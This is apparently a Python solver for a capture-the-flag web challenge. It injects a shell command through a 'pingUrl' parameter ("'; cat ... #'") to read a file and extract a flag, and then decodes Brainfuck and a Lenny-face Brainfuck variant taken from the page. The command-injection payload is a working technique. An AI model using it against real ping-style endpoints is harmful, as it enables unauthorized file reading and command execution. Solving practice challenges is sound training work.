import requests
import re
import sys
import urllib.parse
import brainfuck
import html


def easy_solve(addr):
    # Just send correct command with hash (commenting out) at the end and get the flag
    command = "'; cat near_me/it_is_not_the_flag #'"
    resp = requests.get(addr + '/?pingUrl=' + urllib.parse.quote(command))
    flag = re.search(r'bit{.*}', resp.text).group()
    print(flag)


def easter_eggs(addr):
    # Download Brainfuck and ( ͡° ͜ʖ ͡°)fuck code from page
    resp = requests.get(addr + '/?pingUrl=1.1.1.1')
    brainfuck_code = html.unescape(re.search(r'<b>(.*) END e', resp.text).group(1))
    lennyfuck_code = html.unescape(re.search(r'c END (.*)\n<\/b>', resp.text).group(1))

    # Evaluate Brainfuck code
    brainfuck.evaluate(brainfuck_code)
    print()

    # Transform ( ͡° ͜ʖ ͡°)fuck to Brainfuck (because it's easy) and evaluate created code
    changed_code = lenny_to_brain(lennyfuck_code)
    brainfuck.evaluate(changed_code)


def lenny_to_brain(code):
    transformation = {
        '+': '( ͡° ͜ʖ ͡°)',
        '-': '(> ͜ʖ<)',
        '.': '(♥ ͜ʖ♥)',
        ',': 'ᕙ( ͡° ͜ʖ ͡°)ᕗ',
        '<': '(∩ ͡° ͜ʖ ͡°)⊃━☆ﾟ.*',
        '>': 'ᕦ( ͡°ヮ ͡°)ᕥ',
        '^': 'ᕦ( ͡° ͜ʖ ͡°)ᕥ',
        "v": '( ͡°╭͜ʖ╮ ͡°)',
        "x": 'ಠ_ಠ',
        "[": '( ͡°(',
        "]": ') ͡°)'
    }
    for key in transformation:
        code = code.replace(transformation[key], key)
    return code


if __name__ == '__main__':
    if len(sys.argv) < 1:
        print(f'{sys.argv[0]} [address]')
        sys.exit()

    addr = sys.argv[1]
    easy_solve(addr)
    easter_eggs(addr)